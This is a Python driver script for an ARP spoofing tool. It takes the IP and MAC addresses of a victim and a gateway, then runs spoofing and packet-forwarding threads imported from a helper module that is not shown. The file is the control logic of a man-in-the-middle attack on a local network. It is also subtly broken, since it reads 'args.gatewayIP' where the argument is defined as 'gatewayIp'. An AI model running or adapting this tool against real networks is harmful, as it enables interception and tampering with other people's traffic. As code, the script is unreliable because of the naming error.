import argparse
import threading
from include import spoofing, restore, set_1, set_2, packetforwarding

def main():
    parser = argparse.ArgumentParser(description='python main.py [target ip], [target mac], [gateway ip], [gateway mac]')
    
    parser.add_argument('targetIp', type=str)
    parser.add_argument('targetMac', type=str)
    parser.add_argument('gatewayIp', type=str)
    parser.add_argument('gatewayMac', type=str)
    
    args = parser.parse_args()
    
    set_1(args.targetIp, args.targetMac, args.gatewayIP, args.gatewayMac)
    set_2(args.targetIp, args.targetMac, args.gatewayIP, args.gatewayMac)
    
    arpThread = threading.Thread(target=spoofing, args=(args.targetIp, args.targetMac, args.gatewayIP, args.gatewayMac))
    arpThread.start()
    
    sniffThread = threading.Thread(target=packetforwarding)
    sniffThread.start()
    
    print('ARP Spoofing start')
    print('enter "stop" if you want stop program')
    while(True):
        tmp = input()
        if(tmp == 'stop'):
            break
    
    restore()
    print('ARP Spoofing stop')
    
    